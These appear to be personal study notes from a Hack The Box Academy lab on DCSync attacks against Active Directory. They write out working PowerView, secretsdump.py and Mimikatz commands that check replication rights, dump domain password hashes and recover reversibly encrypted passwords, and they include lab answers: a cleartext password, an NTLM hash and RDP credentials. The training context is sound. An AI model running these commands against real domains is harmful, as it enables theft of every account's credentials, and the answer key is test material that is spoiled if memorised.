
>[!Info]
> A Domain Controller is requested to replicate passwords via the DS-Replication-Get-Changes-All extended right.

**~={red}Prequisites for this attack=~**
>[!info]
> - Must have control over an account that has the rights to perform domain replication, i.e. the following permissions must be set: Replicating Directory Changes and Replicating Directory Changes All
> - Domain/Enterprise and default admins have this right by default

~={red}**Tools to Perform a DCSync Attack**=~
>[!info]
> - Mimikatz
> - Invoke-DCSync
> - Impacket's secretsdump.py


##### Using Get-DomainUser to View adunn's Group Membership
```go
Get-DomainUser -Identity adunn |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

>[!tip] Using PowerView for Permission Confirmation
>- Get the users SID from the above command output
>- Use Get-ObjectAcl to verify against all ACLs set on the domain object

##### Using Get-ObjectAcl to Check adunn's Replication Rights
```go
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
```

```go
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

>[!tip] WriteDacl
> With the WriteDacl, we could add this privilege to a user under our control, perform DCSync, then remove the privilege when done.

### SecretsDump
>[!info]
> - Outputs hash to the file inlanefreight_hashes
> - `-just-dc` flag extracts the NTLM hashes and Kerberos keys from the NTDS file

##### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
```go
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

Secretsdump flag options
>[!tip]
> - `-just-dc-ntlm`: will only get the NTLM hash
> - `-just-dc-user <USERNAME>`: only extract data for a specific user
> - `-pwd-last-set`: see when each accounts password was last changed
> - `-history`: dump password history
> - `-user-status`: verify if a user is disabled

 If a users account has the reversible encryption password option set secretsdump.py can decrypt it while dumping the NTDS file
 
![[Pasted image 20260423135156.png]]
##### Enumerating Further using Get-ADUser
```go
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

>[!INFO]
> The same can be done with PowerView. The below command will show the user `proxyagent` has the reversible encryption option set

##### Checking for Reversible Encryption Option using Get-DomainUser
```go
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

>[!important]
> To perform a DCSync attack via Mimikatz, you must target a specific user. Mimikatz must be ran in the context of the user who has DCSync privileges, for example, the user `adunn`

```go
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

Perform the remaining steps from the newly spawned powershell sessions

```go
.\mimikatz.exe
```

```go
privilege::debug
```

```go
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL
```

----------------------------------------------------

# Questions

```go
xfreerdp /v:10.129.65.133 /u:htb-student /p:'Academy_student_AD!' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/ACE /smart-sizing:2400x1200 /cert:ignore
```

### Question 1: Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer.

Answer:
```go
syncron
```

Use PowerView to find the user
```go
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Question 2: What is this user's cleartext password?

Answer:
```go
Mycleart3xtP@ss!
```

```go
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

### Question 3: Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer.

Answer
```go
4bb3b317845f0954200a6b0acc9b9f9a
```

```go
secretsdump.py -outputfile inlanefreight_hashes -just-dc-user khartsfield INLANEFREIGHT/adunn@172.16.5.5 
```